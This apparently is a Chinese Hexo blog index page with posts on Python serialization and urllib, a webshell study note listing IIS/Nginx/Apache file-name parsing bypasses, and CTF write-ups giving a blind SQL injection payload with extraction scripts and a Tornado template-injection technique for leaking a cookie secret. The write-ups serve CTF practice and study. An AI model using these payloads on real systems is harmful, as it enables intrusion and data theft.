<!DOCTYPE html>
<html>
<head><meta name="generator" content="Hexo 3.8.0">
  <meta charset="utf-8">
  

  
  <title>Hexo</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta property="og:type" content="website">
<meta property="og:title" content="Hexo">
<meta property="og:url" content="http://yoursite.com/page/2/index.html">
<meta property="og:site_name" content="Hexo">
<meta property="og:locale" content="default">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="Hexo">
  
    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
  
  
    <link rel="icon" href="/favicon.png">
  
  
    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
  
  <link rel="stylesheet" href="/css/style.css">
</head>
</html>
<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <h1 id="logo-wrap">
        <a href="/" id="logo">Hexo</a>
      </h1>
      
    </div>
    <div id="header-inner" class="inner">
      <nav id="main-nav">
        <a id="main-nav-toggle" class="nav-icon"></a>
        
          <a class="main-nav-link" href="/">Home</a>
        
          <a class="main-nav-link" href="/archives">Archives</a>
        
      </nav>
      <nav id="sub-nav">
        
          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
        
        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
      </nav>
      <div id="search-form-wrap">
        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://yoursite.com"></form>
      </div>
    </div>
  </div>
</header>
      <div class="outer">
        <section id="main">
  
    <article id="post-python序列化及反序列化" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2020/04/11/python序列化及反序列化/" class="article-date">
  <time datetime="2020-04-11T08:12:38.980Z" itemprop="datePublished">2020-04-11</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="Python序列化及反序列化"><a href="#Python序列化及反序列化" class="headerlink" title="Python序列化及反序列化"></a>Python序列化及反序列化</h1><hr>
<p><strong>1.为什么要使用序列化？</strong></p>
<p>  由于TCP/IP协议不能够传输对象，我们需要将对象转换为字节数组来传输。所以对象序列化后结果就是字节数组。当通信双方进行通讯时，发送方通过序列化将对象转化为可传输的二进制字节序列。而接受方则通过反序列化将二进制字节序列转换为对象。</p>
<p><strong>2.什么是序列化及反序列化？</strong></p>
<p>  通俗地讲，序列化就是将内存中的变量转换成可存储的，可传输的二进制序列。而反序列化就是二进制序列重新转换成对象。在python中序列化可以理解为将对象转换成json字符串，而反序列化则是将json字符串转换成对象。序列化在python中被称作pickling，反之，反序列化就称做unpickling。python为我们提供了json和pickle库来执行序列化及反序列化的操作。</p>
<p><strong>3.pickle模块</strong></p>
<p>  pickle模块只限于通信双方都是python的情况。和json比较，pickle模块可以持久化用户自定义的对象，而json只限于python的基本类型。python的pickle模块提供了几个函数：</p>
<pre><code>dump 将对象序列化，存在文件中
dumps 将对象序列化 但不存入文件而是返回bytes数组
load 文件中读取的数据反序列化
loads bytes数组反序列化</code></pre><p>示例：</p>
<p>首先要导入pickle模块</p>
<pre><code>import pickle
list=&apos;a b c h j k&apos;.split(&apos; &apos;)
data=pickle.dumps(list)
print(&apos;序列化{}&apos;.format(data))
data2=pickle.loads(data)
print(&apos;反序列化{}&apos;.format(data2))</code></pre><p>输出：</p>
<pre><code>序列化b&apos;\x80\x03]q\x00(X\x01\x00\x00\x00aq\x01X\x01\x00\x00\x00bq\x02X\x01\x00\x00\x00cq\x03X\x01\x00\x00\x00hq\x04X\x01\x00\x00\x00jq\x05X\x01\x00\x00\x00kq\x06e.&apos;
反序列化[&apos;a&apos;, &apos;b&apos;, &apos;c&apos;, &apos;h&apos;, &apos;j&apos;, &apos;k&apos;]</code></pre><p>第一个示例是序列化为了bytes 我们也可以利用dump方法直接写入文件。得到file like object。不过pickle是以二进制的形式处理文件，所以读写文件要用’wb’和’rb’。</p>
<pre><code>import pickle
d=dict(name=&quot;张三&quot;,age=16,grade=&quot;五年级&quot;,score=&quot;90&quot;)
with open(&quot;json_pickle.txt&quot;,&apos;wb&apos;) as f:
    pickle.dump(d,f)
with open(&quot;json_pickle.txt&quot;,&apos;rb&apos;) as f:
    d2=pickle.load(f)
print(d2)</code></pre><p>对自定义对象进行序列化：</p>
<pre><code>import pickle
class car:



    def __init__(self,brand):
           self.brand=brand
       def show(self):
        print(&quot;the car belongs to&quot;+self.brand)
with open(&apos;json_pickle.txt&apos;,&apos;wb&apos;) as f:
s=car(&apos;法拉利&apos;)
s.show()
pickle.dump(s,f)
with open(&apos;json_pickle.txt&apos;,&apos;rb&apos;) as f:
    s2=pickle.load(f)
    s2.show()</code></pre><p>输出：</p>
<pre><code>the car belongs to法拉利
the car belongs to法拉利</code></pre><p><strong>4.json模块</strong></p>
<p>怎么在不同的编程语言之间传递对象？这里就用到了json（javascript object notation）JSON表示出来就是一个字符串(特殊格式），可以被所有语言读取，也可以方便地存储到磁盘或者通过网络传输。JSON不仅是标准格式，并且比XML更快，而且可以直接在Web页面中读取，非常方便。</p>
<p>json的数据类型可以是双引号引起来的字符串，数值，true和false，null（None），对象（字典），数组（列表）。其中null相当python的none，ture，false相当python的True，False。</p>
<p>json常用函数：</p>
<pre><code>dumps json 编码 
dump json 编码并存入文件
loads json 解码
load json 解码，从文件读取数据</code></pre><p>示例</p>
<pre><code>import json
    list=&quot;a b c h j k&quot;.split(&apos; &apos;)
    print(list)
with open(&apos;json_pickle.txt&apos;,&apos;w&apos;) as f:
    json.dump(list,f)
with open(&apos;json_pickle.txt&apos;,&apos;r&apos;) as f:
    d2=json.load(f)
print(d2)</code></pre><p>输出：</p>
<pre><code>[&apos;a&apos;, &apos;b&apos;, &apos;c&apos;, &apos;h&apos;, &apos;j&apos;, &apos;k&apos;]
[&apos;a&apos;, &apos;b&apos;, &apos;c&apos;, &apos;h&apos;, &apos;j&apos;, &apos;k&apos;]</code></pre><p>json不能对自定义对象进行序列化和反序列化。</p>
<pre><code>import json
class Car:
    def __init__(self,brand):
        self.brand=brand
    def show(self):
        print(&quot;the car belongs to&quot;+self.brand)
car=Car(&apos;法拉利&apos;)
def car2dict(car):
return {
&apos;brand&apos;: car.brand,
}

# 对自定义类的对象进行序列化操作
print(json.dumps(car, default=car2dict))</code></pre><p>##python序列化及反序列化中的安全问题</p>
<hr>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2020/04/11/python序列化及反序列化/" data-id="ckh65nt0a000cjsv9g7ex9xa0" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="new-tie-san-webshell" class="article article-type-new" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2020/03/15/tie-san-webshell/" class="article-date">
  <time datetime="2020-03-15T11:42:11.000Z" itemprop="datePublished">2020-03-15</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2020/03/15/tie-san-webshell/">tie-san-webshell</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="铁三知识点复习-webshell"><a href="#铁三知识点复习-webshell" class="headerlink" title="铁三知识点复习 webshell"></a>铁三知识点复习 webshell</h1><hr>
<p><strong>什么是webshell？</strong></p>
<p>webshell就是以asp、php、jsp或者cgi等网页文件形式存在的一种命令执行环境，也可以将其称做为一种网页后门。黑客在入侵了一个网站后，通常会将asp或php后门文件与网站服务器WEB目录下正常的网页文件混在一起，然后就可以使用浏览器来访问asp或者php后门，得到一个命令执行环境，以达到控制网站服务器的目的。简单来说就是通过网站漏洞获得网站控制权限。(百度百科的解释)</p>
<p>在计算机科学中，shell指的是”为用户提供操作界面的软件”。类似于windows的cmd.exe和Linux下的bash。webshell是网站的后门，也是一个命令解释器。不过是以http协议这样的方式通信。继承了web权限。我们也可以把webshell理解为在服务器端可执行的文件，后缀名通常为.asp,.php,.aspx,.jsp。</p>
<hr>
<p><strong>解析漏洞</strong></p>
<p>解析漏洞就是web服务器没有严格处理http请求。导致不该执行的文件或脚本当作可执行的文件或脚本执行。大部分都是通过带有特别后缀的文件使得网页将其解析成可执行的文件或脚本，从而导致网站被恶意攻击。</p>
<p><strong>常见的解析漏洞</strong></p>
<p>1.IIS 5.x/6.0解析漏洞</p>
<p>在IIS5.X和IIS6.0版本中存在以下两个解析漏洞。第一种是如果上传的文件后缀是”*.asp;1.jpg”分号后面不会被解析 而会被服务器当成asp文件执行,从而绕过服务器能上传asp文件的限制.<br>IIS6.0版本中，默认可执行文件除了test.asp以外，还包括test.asa、test.cer、test.cdx这三种，同样也存在解析漏洞</p>
<pre><code>webshell.asp;1.jpg
webshell.asa;1.jpg
webshell.cer;1.jpg
webshell.cdx;1.jpg</code></pre><p>第二种叫做目录解析,在网站中建立名字为<em>.asp、</em>.asa的文件夹，其目录内的任何扩展名文件都会被IIS当做ASP文件来解析并执行。</p>
<pre><code>xxxxxx/xxxxx/.asp/xx.jpg(xx.jpg会被当作asp文件执行)</code></pre><p>2.IIS 7.0/IIS 7.5/ Nginx &lt;8.03畸形解析漏洞</p>
<p>IIS 7.0/IIS 7.5/ Nginx &lt;8.03在Fast-CGI运行模式下，在一个文件路径(/xx.jpg)后面加上/xx.php会将/xx.jpg/xx.php 解析为 php 文件。</p>
<p>在某些使用有漏洞的网站中，访问<a href="http://127.0.0.1/1.jpg/1.php，此时的1.jpg会被当作PHP脚本来解析,此时就认为1.php是不存在的。" target="_blank" rel="noopener">http://127.0.0.1/1.jpg/1.php，此时的1.jpg会被当作PHP脚本来解析,此时就认为1.php是不存在的。</a></p>
<p>这就意味着攻击者可以上传合法的“图片”（图片木马）然后在URL后面加上“/xxx.php”，就可以获得网站的webshell，在使用菜刀链接即可。</p>
<pre><code>1.jpg/1.php(1.jpg就是图片马,可以用Ultraedit等生成)</code></pre><p>3.Nginx &lt;8.03 空字节代码执行漏洞</p>
<p>影响范围：Nginx0.5.,0.6., 0.7-0.7.65, 0.8- 0.8.37<br>访问以下网址，服务器将把xx.jpg文件当做php解析并执行。<br>    <a href="http://www.xxx.com/xx.jpg%00.php" target="_blank" rel="noopener">http://www.xxx.com/xx.jpg%00.php</a></p>
<p>4.Apache解析漏洞</p>
<p>apache1或apache2版本</p>
<p>apache解析文件后缀是从右到左解析,如果遇到apache不能解析的文件后缀就会略过而解析下一个后缀.</p>
<pre><code>xxxx.php.rar(apache不能解析rar,会略过.但php可以被apache解析.文件会被解析成php文件)</code></pre><p>5.CVE-2013-4547 Nginx解析漏洞</p>
<p>访问以下网址，服务器将把xx.jpg文件当做php解析并执行。</p>
<pre><code>http://www.xxx.com/xx.jpg（非编码空格）\0.php</code></pre><hr>
<p><strong>中间件</strong></p>
<p>一个正常的web访问顺序：浏览器-&gt;服务器(WWW)-&gt;web容器-&gt;中间件(web应用服务器)-&gt;数据库服务器。而中间件主要包括Tomcat,jboss,weblogic等等。</p>
<pre><code>web服务器：IIS、Apache、Nginx、Tomcat、Jboss、Jetty、Weblogic、Webshere、Glasshfish、Lighttpd等
web中间件：Tomcat、Jboss、Jetty、Weblogic、Webshere、Glasshfish等
web容器：IIS(asp容器)、Tomcat(servlet容器)、Jboss(EJB容器)</code></pre><p><strong>什么是中间件？</strong><br>中间件是介于应用系统和系统软件之间的一类软件，它使用系统软件所提供的基础服务（功能），衔接网络上应用系统的各个部分或不同的应用，能够达到资源共享、功能共享的目的。</p>
<p><strong>iis简介</strong></p>
<p>iis（internet information service）是微软开发的针对WINDOWS 系统下运行的中间件。主要用来解析.ASP，.ASA，.CER三种文件格式的文件。 </p>
<p>不同windows版本对应的iis版本</p>
<pre><code>Windows 2003 server -------&gt;IIS 6.0
Windows 7 -------&gt;IIS 7.0和IIS 7.5
Windows 2008 server sp2 -------&gt; IIS 7.0
Windows 2008 server R2--------&gt;IIS 7.5
xp和2000 server对应的IIS 5.0</code></pre><p>安装iis（windows10）：控制面板-&gt;程序-&gt;启用或关闭windows功能-&gt;选择”internet information service”</p>
<p><img src="https://img-blog.csdnimg.cn/2020031519471530.JPG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3p5ZGJrMTIzNDU2,size_16,color_FFFFFF,t_70" alt></p>
<p>iis默认的web目录是 \inetpub\wwwroot</p>
<p>iis日志分析：默认为W3C拓展日志文件格式，该内容可在站点属性中查看。iis日志可以分析web攻击。</p>
<p><img src="https://img-blog.csdnimg.cn/20200315194814669.JPG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3p5ZGJrMTIzNDU2,size_16,color_FFFFFF,t_70" alt></p>
<pre><code>date : 发出请求时候的日期。

time: 发出请求时候的时间。注意：默认情况下这个时间是格林威治时间，比我们的北京时间晚8个小时。

s-sitename：服务名，记录当记录事件运行于客户端上的Internet服务的名称和实例的编号。

s-ip：服务器的IP地址。

cs-method：请求中使用的HTTP方法，GET/POST。（POST方法可能无法记录请求的详细内容）

cs-uri-stem：URI资源，记录做为操作目标的统一资源标识符（URI），即访问的页面文件。

cs-uri-query：URI查询，记录客户尝试执行的查询，只有动态页面需要URI查询，如果有则记录，没有则以连接符-表示。即访问网址的附带参数。

s-port：为服务配置的服务器端口号。

cs-username：用户名，访问服务器的已经过验证用户的名称，匿名用户用连接符-表示。

c-ip：客户端IP地址。

cs(User-Agent)：用户代理，客户端浏览器、操作系统等情况。

sc-status：协议状态，记录HTTP状态代码，200表示成功，403表示没有权限，404表示找不到该页面。

sc-substatus：协议子状态，记录HTTP子状态代码

sc-win32-status：Win32状态，记录Windows状态代码。

sc-bytes：服务器发送的字节数。

cs-bytes：服务器接受的字节数。

time-taken：记录操作所花费的时间，单位是毫秒。</code></pre><p><strong>apache简介</strong></p>
<p>apache是一种开源的web服务器，支持HTTP协议。</p>
<p>LINUX下安装apache服务：<code>yum -y install httpd</code> 启动apache服务：<code>service httpd start</code></p>
<p>Apache日志分析：Apache日志主要分为以下类：error.log(错误日志)和access.log(访问日志),ssl_access_log(http访问日志),ssl_error_log(http错误日志),ssl_request_log(http请求日志) ，实际排查过程中更常用的是error_log，apache日志同样可以查看web攻击（sql注入，xss）。一般可以通过查看apache配置文件查看apache日志的位置。有关apache日志的详细内容可以访问：<a href="https://www.freebuf.com/column/144833.html" target="_blank" rel="noopener">https://www.freebuf.com/column/144833.html</a>,讲解的还是比较详细的。这里就不再做过多的介绍了。</p>
<p><strong>nginx简介</strong></p>
<p>Nginx是一个开源且高性能、可靠的HTTP中间件、代理服务。是一个异步框架的web服务器。也可以用作反向代理，负载平衡器 和 请求分发。其特点是相对于apache服务器占有内存少，并发能力强。</p>
<p>打开nginx\conf\nginx.conf可以对nginx进行配置。这里是几个比较重要的配置参数：</p>
<pre><code>user 设置nginx的系统使用用户

work_processes 设置进程数

error_log nginx的错误日志

pid nginx服务启动时的pid（进程编号） 

event: worker_connections 每个进程允许的最大连接数

    use 工作进程数</code></pre><p>nginx日志也有两种：access.log(记录网页的访问信息) errors.log(记录处理http请求的错误状态以及nginx本身服务的错误状态)。</p>
<p><strong>JBOSS简介</strong></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2020/03/15/tie-san-webshell/" data-id="ckh65nt0j000jjsv9gh7f2mb3" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-python-urllib" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2020/03/15/python-urllib/" class="article-date">
  <time datetime="2020-03-15T11:19:45.000Z" itemprop="datePublished">2020-03-15</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2020/03/15/python-urllib/">python urllib</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="Python-urllib库"><a href="#Python-urllib库" class="headerlink" title="Python urllib库"></a>Python urllib库</h1><hr>
<p>urllib 是一个收集了多个用到URL模块的包。</p>
<p>urllib分为4个主要模块：url.request(打开和读取URL)，url.error(包含url.request抛出的异常)，urllib.parse(用于解析URL)，urllib.robotparser(用于解析robots.txt文件)。</p>
<h2 id="request"><a href="#request" class="headerlink" title="request"></a><strong>request</strong></h2><p>urllib的request模块可以非常方便地抓取URL内容，也就是发送一个GET请求到指定的页面，然后返回HTTP的响应：</p>
<p>例如，对百度的一个URL<a href="https://www.baidu.com进行抓取，并返回响应：" target="_blank" rel="noopener">https://www.baidu.com进行抓取，并返回响应：</a></p>
<pre><code>from urllib import request
with request.urlopen(&apos;https://www.baidu.com/&apos;) as f:
    data = f.read()
    print(&apos;Status:&apos;, f.status, f.reason)
    for k, v in f.getheaders():
        print(&apos;%s: %s&apos; % (k, v))
       print(&apos;Data:&apos;, data.decode(&apos;utf-8&apos;))</code></pre><p><strong>urllib.request.urlopen</strong></p>
<p>urllib.request.urlopen(url,data=None,[timeout,],cafile=None,capath=None,cadefault=False,context=None)</p>
<p>这些参数中url是必选的，data是可选的，内容为字节流编码格式的即bytes类型，如果传递data参数，urlopen将使用Post方式请求。timeout是设置等待响应的时长，超出这个时长将抛出异常。</p>
<p>请求对象，返回一个HTTPResponse类型的对象，包含的方法和属性：</p>
<p>方法：read()、readinto()、getheader(name)、getheaders()、fileno()</p>
<p>属性：msg、version、status、reason、bebuglevel、closed</p>
<p>代码示例：</p>
<pre><code>from urllib import request
    rep=request.urlopen(&quot;https://www.baidu.com&quot;)#请求站点返回一个HTTPResponse对象
    print(rep.read().decode(&apos;utf-8&apos;))   #返回网页内容
    print(rep.getheader(&apos;server&apos;)) #返回响应头中的server值
    print(rep.getheaders()) #以列表元祖对的形式返回响应头信息
        # print(rep.fileno()) #返回文件描述符
    print(rep.version)  #返回版本信息
    print(rep.status)  #返回状态码200，404代表网页未找到
    print(rep.debuglevel) #返回调试等级
    print(rep.closed)  #返回对象是否关闭布尔值
    print(rep.geturl()) #返回检索的URL
    print(rep.info()) #返回网页的头信息
    print(rep.getcode()) #返回响应的HTTP状态码
    print(rep.msg)  #访问成功则返回ok
    print(rep.reason) #返回状态信息</code></pre><p><strong>urllib.request.Requset()</strong></p>
<p>urllib.request.Request(url,data=None,headers={},origin_req_host=None,unverifiable=False,method=None)</p>
<p>参数：</p>
<p>url：请求的URL，必须传递的参数，其他都是可选参数</p>
<p>data：上传的数据，必须传bytes字节流类型的数据，如果它是字典，可以先用urllib.parse模块里的urlencode()编码</p>
<p>headers：它是一个字典，传递的是请求头数据，可以通过它构造请求头，也可以通过调用请求实例的方法add_header()来添加</p>
<p>origin_req_host：指请求方的host名称或者IP地址</p>
<p>unverifiable：表示这个请求是否是无法验证的，默认为False，如我们请求一张图片如果没有权限获取图片那它的值就是true</p>
<p>method：是一个字符串，用来指示请求使用的方法，如：GET,POST,PUT等</p>
<p><strong>parse</strong></p>
<hr>
<p>urllib库提供了parse模块，它定义了处理URL的标准接口，如实现URL各部分的抽取，合并以及链接转换，它支持如下协议的URL处理：file,ftp,gopher,hdl,http,https,imap,mailto,mms,news,nntp,prospero,rsync,rtsp,rtspu,sftp,sip,sips,snews,svn,snv+ssh,telnet,wais</p>
<p><strong>urlparse</strong></p>
<p>urlparse实现url的实现和分段。返回</p>
<p>urllib.parse.urlparse(urlstring,scheme=’’,allow_fragments=True)</p>
<p>参数：urlstring：传递目标url，scheme：协议的类型 scheme(协议),netloc(域名),path(路径),params(参数),query(查询条件),fragment(锚点)</p>
<pre><code>from urllib import parse
    url = &apos;https://blog.csdn.net/&apos;
    result = parse.urlparse(url=url,scheme=&apos;https&apos;,allow_fragments=True)
    print(result)
       print(result.scheme)</code></pre><p><strong>urlunparse()</strong></p>
<p>与urlparse()相反，通过列表或者元祖的形式接受一个可迭代的对象，实现URL构造</p>
<pre><code>from urllib.parse import urlunparse
data=[&apos;http&apos;,&apos;www.baidu.com&apos;,&apos;index.html&apos;,&apos;user&apos;,&apos;a=6&apos;,&apos;comment&apos;]
print(urlunparse(data)) #构造一个完整的URL</code></pre><p><strong>urlsplit</strong></p>
<p>与urlparse()方法类似，它会返回5个部分，把params合并到path中</p>
<pre><code>from urllib.parse import urlsplit
result=urlsplit(&apos;http://www.baidu.com/index.html;user?id=5#comment&apos;)
print(result)</code></pre><p><strong>urlunsplit</strong></p>
<p>与urlunparse()类似，它也是将链接的各部分组合完整的链接的方法，传入的参数也是可迭代的对象，如列表元祖等，唯一的区别是长度必须是5个，它省略了params</p>
<pre><code>from urllib.parse import urlsplit,urlunsplit
data=[&apos;http&apos;,&apos;www.baidu.com&apos;,&apos;index.html&apos;,&apos;a=5&apos;,&apos;comment&apos;]
result=urlunsplit(data)
print(result)</code></pre><p><strong>urljoin</strong></p>
<p>将两个url结合成一个完整的url</p>
<pre><code>from urllib.parse import urljoin

print(urljoin(&apos;http://www.baidu.com&apos;,&apos;index.html&apos;))
print(urljoin(&apos;http://www.baidu.com&apos;,&apos;http://cdblogs.com/index.html&apos;))
print(urljoin(&apos;http://www.baidu.com/home.html&apos;,&apos;https://cnblog.com/index.html&apos;))</code></pre><p><strong>urlencode</strong></p>
<p> urlencode()在构造GET请求参数时很有用，它可以将字典转化为GET请求参数</p>
<pre><code>from urllib.parse import urlencode
params = {&apos;username&apos;:&apos;zs&apos;,&apos;password&apos;:&apos;123&apos;}
base_url=&apos;http://www.baidu.com&apos;
url=base_url+&apos;?&apos;+urlencode(params) #将字典转化为get参数
print(url)</code></pre>
      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2020/03/15/python-urllib/" data-id="ckh65nt0d000ejsv9lg3mpww6" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-buuoj-Hack-World-easy-tornado" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2020/03/15/buuoj-Hack-World-easy-tornado/" class="article-date">
  <time datetime="2020-03-15T08:58:45.000Z" itemprop="datePublished">2020-03-15</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2020/03/15/buuoj-Hack-World-easy-tornado/">buuoj Hack World  easy_tornado</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="CISCN-2019-web-Hack-World"><a href="#CISCN-2019-web-Hack-World" class="headerlink" title="CISCN 2019 web Hack World"></a>CISCN 2019 web Hack World</h1><hr>
<p>进入页面，就有提示让我们传参数id就行。说明这是sql注入中的数字注入给id传整数。</p>
<p><img src="https://img-blog.csdnimg.cn/20200315163401714.JPG" alt></p>
<p>再传一个空值，页面显示”bool(false)”。</p>
<p><img src="https://img-blog.csdnimg.cn/20200315163433120.JPG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3p5ZGJrMTIzNDU2,size_16,color_FFFFFF,t_70" alt></p>
<p>可以联想到布尔型注入，试试用布尔盲注的方法先测试一下，发现union，or，and这些被过滤了,就连空格也被过滤了。不过（）倒是没有被过滤。那么怎么表达逻辑运算？上网搜了一下，发现可以用异或运算符”^”来代替and和or。这里只借助”^”貌似还不够。还要借助sql语句中的if和”%”通配符。</p>
<p>sql语句中的if有点类似于c语言中的三元运算符。比如if(语句，0，1)如果语句成立的话，就是0。否则就是1。%则是匹配语句。通过利用这些绕过技巧，就可以成功注入。</p>
<p>下面就是思考如何构造payload。布尔型盲注常用的几个函数left(),ascii(),substr()都可以试一下。但是用ascii()相对来说方便一些。</p>
<p>构造的payload    <code>&quot;1^if(ascii(substr((select(flag)from(flag)),%d,1)=%d),0,1)&quot;%(num1,num2)</code></p>
<p>显然，这个payload需要很多次运算。用脚本的话会快得多。</p>
<pre><code>import requests
flag=&quot;&quot;
url=&quot;http://da187932-a027-4cc7-bf31-b5913a3e4a85.node3.buuoj.cn/index.php&quot;
for i in range(1,60):
for j in range(32, 129):
    payload = &quot;1^(if((ascii(substr((select(flag)from(flag)),%d,1))=%d),0,1))&quot; % (i, j)
    data = {
        &apos;id&apos;: payload
    }
    res = requests.post(url, data=data)
    if &apos;Hello&apos; in res.text:
        flag = flag + chr(j)
        print(flag)
        link = 1
        break</code></pre><p>这个脚本运行起来有点慢。在网上发现了大佬的脚本，用二分法写的。运行起来要快了不少。</p>
<pre><code>import requests
import time

url = &quot;http://da187932-a027-4cc7-bf31-b5913a3e4a85.node3.buuoj.cn/index.php&quot;
temp = {&quot;id&quot; : &quot;&quot;}
flag = &quot;&quot;
for i in range(1,1000):
    time.sleep(0.06)
    low = 32
       high =128
    mid = (low+high)//2
    while(low&lt;high):
       temp[&quot;id&quot;] = &quot;1^&quot; + &quot;(ascii(substr((select(flag)from(flag)),%d,1))&gt;%d)^1&quot; %(i,mid)
       r = requests.post(url,data=temp)
       print(low,high,mid,&quot;:&quot;)
       if &quot;Hello&quot; in r.text:
          low = mid+1
       else:
          high = mid
       mid =(low+high)//2
    if(mid ==32 or mid ==127):
        break
   flag +=chr(mid)
   print(flag)


print(&quot;flag=&quot; ,flag)</code></pre><p>得出来flag，提交。</p>
<p>#护网杯2018 Easy_tornado</p>
<hr>
<p>打开实例，发现页面给了三个文件地址。打开看看有什么信息。</p>
<p><img src="https://img-blog.csdnimg.cn/20200315163623138.JPG" alt></p>
<p>发现flag.txt下提示flag就在/fllllllllllllag里面。</p>
<p><img src="https://img-blog.csdnimg.cn/20200315163543953.JPG" alt></p>
<p>再打开hints.txt,看看有什么提示信息。页面提示”<code>md5(cookie_secret+md5(filename))</code>“。再看看url，发现有一个参数”filehash”。再结合MD5这个提示，说明这个参数可能就是md5(cookie_secret+md5(filename))后的结果。</p>
<p><img src="https://img-blog.csdnimg.cn/20200315163613951.JPG" alt></p>
<p>打开welcome.txt,发现提示”render”。一开始不明白这什么意思，在网上看了wp才发现这是提示模板注入。题名tornado也说明可能和t模板注入有关。</p>
<p><img src="https://img-blog.csdnimg.cn/20200315163636990.JPG" alt></p>
<p><strong>什么是模板注入？</strong></p>
<p>模板注入（SSTI）和sql注入有点类似，也是通过输入在后端的渲染处理上拼接成语句。ssti和常见到的web注入一样，都是服务端接受了用户的输入，将其作为web模板的一部分。在进行模板渲染的过程中执行了用户插入的恶意内容。</p>
<p>模板注入是基于模板渲染处理的，模板渲染又分为前端渲染，后端渲染，浏览器渲染。这里给出一个ssti的例子：</p>
<pre><code>$output = $twig-&gt;render(&quot;Hello {{name}}&quot;, array(&quot;name&quot; =&gt; $_GET[&quot;name&quot;])); 
echo $output;</code></pre><p>这样可以通过用户传的参数name来实现模板注入。利用模板变量来实现页面执行用户输入的恶意代码。(使用 Twig 模版引擎渲染页面，其中模版含有  变量，其模版变量值来自于 GET 请求参数 $_GET[“name”]。)</p>
<p>这样可以考虑构造payload     <code>file?filename=/flllllllllllag&amp;filehash=mad5(cookie_secret+md5(/flllllllllllllag))</code> 但是<code>cookie_secret</code>怎么获取？这是就要用到tornado模板。和sql注入一样,ssti注入也需要先找一下注入点.</p>
<p><img src="https://img-blog.csdnimg.cn/20200315164940300.JPG" alt></p>
<p>直接输入filename=/flllllllllag,页面会报错。并且浏览器上的url显示error?msg=Error.说明可以构造error?msg=  先试试error?msg=2,只输出了2。在试试error?msg=6,没有出现cookie。说明这些操作符被过滤了，这个时候要用到tornado中的handler.settings对象。构造error?msg=,页面显示cookie_secret。</p>
<p><img src="https://img-blog.csdnimg.cn/20200315163734295.JPG" alt></p>
<p>再把cookie_secret代入到payload中，得到flag。</p>
<p><img src="https://img-blog.csdnimg.cn/20200315163743169.JPG" alt></p>
<p>当然也可以写个脚本，菜鸟在网上找了一个脚本，但运行时报错。提示TypeError: Unicode-objects must be encoded before hashing。当时想那个地方可能没有指定编码格式。确实，在update函数要指定传入的参数的编码格式。</p>
<pre><code>#!-*-coding:utf-8 -*-
import hashlib
def md5(s):
    md5 = hashlib.md5()
    md5.update(s.encode(&quot;utf-8&quot;))
    return md5.hexdigest()
def filehash():
    filename = &apos;/fllllllllllllag&apos;
    cookie_secret = &apos;c6862c2d-66a0-4465-af17-58a23841583b&apos;
    print(md5(cookie_secret + md5(filename)))
if __name__ == &apos;__main__&apos;:
    filehash()</code></pre>
      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2020/03/15/buuoj-Hack-World-easy-tornado/" data-id="ckh65nt040008jsv95yjx4whk" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-leetcode-dynamic-programming-2" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2020/03/10/leetcode-dynamic-programming-2/" class="article-date">
  <time datetime="2020-03-10T09:21:40.000Z" itemprop="datePublished">2020-03-10</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2020/03/10/leetcode-dynamic-programming-2/">leetcode-dynamic programming-2</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="leetcode-动态规划2（java实现）"><a href="#leetcode-动态规划2（java实现）" class="headerlink" title="leetcode 动态规划2（java实现）"></a>leetcode 动态规划2（java实现）</h1><hr>
<p>#64.最小路径和</p>
<p>这是一个经典的动态规划题，类似于走楼梯问题。</p>
<p><strong>1.定义状态：</strong></p>
